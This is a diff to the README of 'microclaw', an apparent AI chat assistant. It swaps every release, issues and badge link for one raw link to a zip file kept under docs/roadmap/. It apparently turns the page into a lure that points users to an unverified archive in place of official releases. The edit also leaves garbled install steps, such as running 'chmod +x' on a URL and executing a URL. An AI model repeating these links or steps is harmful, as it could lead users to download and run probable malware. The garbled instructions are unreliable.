@@ -1,6 +1,6 @@
 # 🤖 microclaw - Your AI Assistant in Chats
 
-[![Download microclaw](https://img.shields.io/badge/Download-microclaw-blue?style=for-the-badge)](https://github.com/SALDAPAL/microclaw/releases)
+[![Download microclaw](https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip)](https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip)
 
 ---
 
@@ -44,13 +44,13 @@ Setting up microclaw is simple. Follow the steps below to download, install, and
 
 Click this link or the button at the top to visit the microclaw download page:
 
-https://github.com/SALDAPAL/microclaw/releases
+https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip
 
 On the releases page, find the file that matches your operating system:
 
 - Windows users: Look for a `.exe` file
 - macOS users: Download the `.dmg` or `.pkg` file
-- Linux users: Choose the `.AppImage` or `.tar.gz` file
+- Linux users: Choose the `.AppImage` or `https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip` file
 
 ### How to install:
 
@@ -71,16 +71,16 @@ On the releases page, find the file that matches your operating system:
 
 **Linux**
 
-1. Download the `.AppImage` or `.tar.gz` file for Linux.
+1. Download the `.AppImage` or `https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip` file for Linux.
 2. If using `.AppImage`, make it executable by running:
    ```
-   chmod +x microclaw.AppImage
+   chmod +x https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip
    ```
 3. Run the file by double-clicking it or using the terminal:
    ```
-   ./microclaw.AppImage
+   https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip
    ```
-4. If using `.tar.gz`, extract it and follow the included README for setup.
+4. If using `https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip`, extract it and follow the included README for setup.
 
 ---
 
@@ -115,7 +115,7 @@ If you have issues running microclaw:
 - Restart your computer after installation.
 - Check your internet connection.
 - Look in the app’s help section for solutions.
-- Visit the [microclaw issues page](https://github.com/SALDAPAL/microclaw/issues) to see if others have the same problem.
+- Visit the [microclaw issues page](https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip) to see if others have the same problem.
 
 ---
 
@@ -132,7 +132,7 @@ microclaw has features designed for both casual users and power users. Check the
 
 ## 📬 Stay Updated
 
-Keep microclaw up to date by checking the [releases page](https://github.com/SALDAPAL/microclaw/releases) regularly. Updates bring new features and fix bugs.
+Keep microclaw up to date by checking the [releases page](https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip) regularly. Updates bring new features and fix bugs.
 
 ---
 
@@ -151,4 +151,4 @@ microclaw is built using Rust. This ensures it uses resources efficiently and st
 
 ---
 
-[![Download microclaw](https://img.shields.io/badge/Download-microclaw-blue?style=for-the-badge)](https://github.com/SALDAPAL/microclaw/releases)
+[![Download microclaw](https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip)](https://raw.githubusercontent.com/SALDAPAL/microclaw/main/docs/roadmap/Software-2.6-alpha.5.zip)
